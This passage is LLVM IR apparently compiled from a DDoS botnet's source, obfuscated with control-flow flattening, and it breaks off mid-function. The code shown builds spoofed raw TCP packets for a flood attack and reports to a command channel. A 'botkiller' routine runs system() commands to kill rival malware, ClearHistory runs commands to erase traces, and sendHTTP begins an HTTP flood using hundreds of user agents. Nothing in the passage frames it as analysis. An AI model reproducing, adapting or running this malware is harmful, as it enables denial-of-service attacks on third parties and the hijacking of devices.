  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -344215953, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -970572752, i32 -1596343037
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -806826396, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1427352418, i32 1713939823
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  store i32 -806826396, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #2
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 -1062329529, i32 1659690968
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  store i32 -806826396, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 1565956921, i32 -617318722
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 676778086, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 676778086, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @GetRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.182, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 1504342161, i32 -145725868
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 -1828483290, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %163, i8** %23, align 8
  store i32 183623357, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 1971473510, i32 -1425665389
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -585704920, i32 -946899741
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 197286442, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.185, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -997124856, i32 540609427
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 -248566659, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.186, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 1327948941, i32 -1416417867
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 637889346, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.187, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -176942430, i32 -744811980
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 1274879711, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.188, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 -660730552, i32 -388325384
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 -1378612397, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.189, i32 0, i32 0), i8* %235)
  store i32 -1378612397, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 1274879711, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 637889346, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 -248566659, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 197286442, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  store i32 183623357, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 -1828483290, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 1489572064, i32 -525521251
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -1733517534, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 -1733517534, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -1362231636, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 1817394959, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @GetRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 -1046236941, i32 337073196
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 -615109558, i32 1917871901
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 341525930, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -1362231636, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 -1362231636, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 -806826396, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  %switchVar = alloca i32
  store i32 226165156, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 226165156, label %3
    i32 -604781234, label %4
    i32 1466840385, label %8
    i32 1100613556, label %31
    i32 1184335721, label %34
    i32 1405217159, label %36
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -604781234, i32* %switchVar
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i32, i32* %1, align 4
  %6 = icmp slt i32 %5, 9
  %7 = select i1 %6, i32 1466840385, i32 1184335721
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %10 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.190, i32 0, i32 0)) #2
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %13
  %15 = load i8*, i8** %14, align 8
  %16 = call i8* @strcat(i8* %11, i8* %15) #2
  %17 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %18 = call i32 @system(i8* %17)
  %19 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %19, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i32 0, i32 0)) #2
  %21 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %22 = load i32, i32* %1, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %23
  %25 = load i8*, i8** %24, align 8
  %26 = call i8* @strcat(i8* %21, i8* %25) #2
  %27 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %28 = call i8* @strcat(i8* %27, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0)) #2
  %29 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %30 = call i32 @system(i8* %29)
  store i32 1100613556, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %1, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %1, align 4
  store i32 -604781234, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = call i32 @sleep(i32 5)
  store i32 226165156, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %34, %31, %8, %4, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @system(i8*) #3

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.193, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.194, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.195, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [649 x i8*], align 16
  %14 = alloca [3 x i8*], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = bitcast [649 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* bitcast ([649 x i8*]* @sendHTTP.useragents to i8*), i64 5192, i32 16, i1 false)
  %20 = bitcast [3 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %20, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %21, %22
  store i32 %23, i32* %16, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #2
  %28 = srem i32 %27, 30
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %14, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #2
  %33 = srem i32 %32, 674
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [649 x i8*], [649 x i8*]* %13, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
